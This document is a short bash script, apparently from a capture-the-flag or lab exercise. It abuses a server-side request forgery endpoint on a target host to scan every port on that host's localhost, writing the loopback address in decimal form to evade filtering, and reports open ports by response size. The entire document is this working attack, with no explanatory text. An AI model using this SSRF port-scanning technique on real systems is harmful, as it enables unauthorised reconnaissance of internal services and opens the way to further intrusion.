for x in {1..65535}; do 
    cmd=$(curl -so /dev/null http://10.10.207.46:8000/attack?url=http://2130706433:${x} -w '%{size_download}');
        echo $cmd
    if [ $cmd != 1045 ]; then
        echo "Open port: $x"
    fi
done